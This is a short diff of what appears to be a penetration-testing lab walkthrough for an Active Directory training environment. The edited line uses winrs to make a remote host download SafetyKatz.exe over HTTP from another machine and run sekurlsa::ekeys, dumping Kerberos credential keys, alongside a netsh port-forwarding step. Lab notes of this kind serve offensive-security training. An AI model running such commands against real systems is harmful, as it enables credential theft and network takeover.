@@ -680,7 +680,7 @@ $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=808
 * Make sure to host `SafetyKatz.exe` on **HFS**
 
 ```powershell
-$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+ $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.13:6565/SafetyKatz.exe sekurlsa::ekeys exit
 ```
 
 _**Right Output -:**_
